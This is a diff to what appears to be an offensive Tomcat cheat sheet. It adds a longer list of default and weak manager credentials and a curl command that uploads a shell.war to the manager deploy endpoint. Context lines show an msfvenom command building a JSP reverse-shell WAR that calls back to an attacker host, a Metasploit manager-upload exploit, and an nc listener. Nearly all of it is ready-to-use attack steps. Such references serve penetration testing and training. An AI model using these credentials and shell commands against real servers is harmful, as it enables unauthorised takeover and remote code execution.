@@ -4,13 +4,28 @@
 
 ### Default Credentials
 
-* admin:admin
-* tomcat:tomcat
-* admin:
-* admin:s3cr3t
-* tomcat:s3cr3t
-* tomcat:s3cret
-* admin:tomcat
+```
+admin:
+admin:admin
+admin:password
+admin:password1
+admin:Password1
+admin:tomcat
+manager:manager
+root:changethis
+root:password
+root:password1
+root:root
+root:r00t
+root:toor
+tomcat:(empty)
+tomcat:admin
+tomcat:changethis
+tomcat:password
+tomcat:password1
+tomcat:s3cret
+tomcat:tomcat
+```
 
 ### Bruteforce
 
@@ -48,6 +63,8 @@ msf exploit(multi/http/tomcat_mgr_upload) > exploit
 # msfvenom - manually
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=8083 -f war -o revshell.war
 # upload it to tomcat and access it : /revshell/
+curl --upload-file shell.war -u 'tomcat:password' "https://example.com/manager/text/deploy?path=/shell"
+
 # host
 nc -lvnp 8083
 ```
